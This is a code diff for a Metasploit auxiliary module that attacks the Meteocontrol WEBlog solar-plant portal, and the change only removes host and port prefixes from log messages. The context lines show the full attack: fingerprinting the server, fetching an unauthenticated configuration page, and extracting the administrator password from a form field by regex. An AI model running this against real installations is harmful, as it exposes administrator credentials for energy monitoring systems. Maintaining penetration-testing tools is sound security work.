@@ -59,15 +59,15 @@ class MetasploitModule < Msf::Auxiliary
         'method' => 'GET'
       })
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
-      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
+      print_error("HTTP Connection Failed...")
       return false
     end
 
     if (res && res.code == 200 && (res.headers['Server'] && res.headers['Server'].include?('IS2 Web Server') || res.body.include?("WEB'log")))
-      print_good("#{rhost}:#{rport} - Running Meteocontrol WEBlog management portal...")
+      print_good("Running Meteocontrol WEBlog management portal...")
       return true
     else
-      print_error("#{rhost}:#{rport} - Application does not appear to be Meteocontrol WEBlog. Module will not continue.")
+      print_error("Application does not appear to be Meteocontrol WEBlog. Module will not continue.")
       return false
     end
   end
@@ -77,14 +77,14 @@ class MetasploitModule < Msf::Auxiliary
   #
 
   def do_extract()
-    print_status("#{rhost}:#{rport} - Attempting to extract Administrator password...")
+    print_status("Attempting to extract Administrator password...")
     begin
       res = send_request_cgi({
         'uri' => '/html/en/confAccessProt.html',
         'method' => 'GET'
       })
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
+      print_error("HTTP Connection Failed...")
       return
     end
 
@@ -92,7 +92,7 @@ class MetasploitModule < Msf::Auxiliary
       get_admin_password = res.body.match(/name="szWebAdminPassword" value="(.*?)"/)
       if get_admin_password[1]
         admin_password = get_admin_password[1]
-        print_good("#{rhost}:#{rport} - Password is #{admin_password}")
+        print_good("Password is #{admin_password}")
         report_cred(
           ip: rhost,
           port: rport,
